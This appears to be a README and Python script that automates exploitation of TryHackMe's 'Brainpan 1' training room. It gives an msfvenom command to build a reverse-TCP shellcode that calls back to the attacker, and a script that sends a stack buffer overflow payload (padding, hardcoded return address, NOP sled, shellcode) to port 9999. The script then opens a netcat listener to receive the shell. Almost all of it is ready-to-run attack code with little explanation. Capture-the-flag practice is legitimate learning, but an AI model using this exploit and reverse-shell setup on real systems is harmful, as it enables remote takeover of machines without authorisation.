# TryHackMe's "Brainpan 1" room (https://tryhackme.com/room/brainpan).

# First of all create your shellcode for linux with:
(msfvenom -p linux/x86/  shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00")
# Introduce the shellcode in the payload.

```
import socket
import subprocess
import time



print ("Autopwnd TryHackMe's Brainpan 1 room (https://tryhackme.com/room/brainpan).")
print ("Please first of all read README.md")
victim = input("Enter your ip you want to attack:")

ip = victim
port = 9999

#badchars = \x00

#Return Direcction (0x311712f3)

prefix = ""
offset = 0
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = ""
payload = "\x41" * 520
payload += retn
payload += "\x90" * 30
payload += (ENTER YOUR SHELLCODE HERE)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

command = "nc -nvlp 4444" # Chage this if you change the port doing your shellcode introduced on payload
subprocess.call(command, shell=True)
```
